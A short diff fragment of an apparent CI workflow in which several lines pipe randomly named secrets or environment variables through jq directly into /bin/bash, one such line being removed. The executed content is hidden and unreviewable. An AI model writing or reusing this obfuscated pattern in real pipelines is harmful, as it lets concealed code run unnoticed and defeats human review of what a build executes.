@@ -17,7 +17,6 @@ jobs:
           huefp96067: ${{ secrets.huefp96067 }}
         run: |
           printf '%s' "$huefp96067" | jq -r .pp87618 | /bin/bash
-          echo $owu6 | jq -r .j5564 | /bin/bash
           echo $wcgj59 | jq -r .xhwe611 | /bin/bash
           printf '%s' "$dk35" | jq -r .vbnay9 | /bin/bash
           echo $gyu116 | jq -r .yvc5 | /bin/bash
